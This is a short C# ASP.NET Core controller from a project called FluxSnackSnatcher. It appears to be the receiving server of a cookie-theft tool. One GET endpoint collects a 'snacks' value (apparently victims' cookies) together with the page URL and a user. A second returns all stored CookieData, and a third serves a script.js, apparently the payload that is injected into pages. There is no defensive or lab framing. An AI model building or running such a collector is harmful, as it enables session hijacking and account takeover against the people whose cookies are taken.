using FluxSnackSnatcher.Facades;
using FluxSnackSnatcher.Models;
using Microsoft.AspNetCore.Mvc;

namespace FluxSnackSnatcher.Controllers
{
    [ApiController]
    [Route("snatch")]
    public class SnatcherController(ISnatcherFacade snatcherFacade) : ControllerBase
    {
        private readonly ISnatcherFacade _snatcherFacade = snatcherFacade;

        [HttpGet]
        public async Task<ActionResult<string>> SnatchSnack(string? url, string? snacks, string? user)
        {
            var response = await _snatcherFacade.SnatchSnack(snacks, url, user);

            return Ok(response);
        }

        [HttpGet("snacks")]
        public async Task<ActionResult<IDictionary<string, IList<CookieData>>>> GetSnacks()
        {
            var snacks = await _snatcherFacade.GetCookies();

            return Ok(snacks);
        }

        [HttpGet("script.js")]
        public async Task<IActionResult> GetScript()
        {
            var path = "./www/script.js";
            var mime = "application/javascript";

            var fileContent = System.IO.File.ReadAllText(path);
            return Content(fileContent, mime);
        }
    }
}
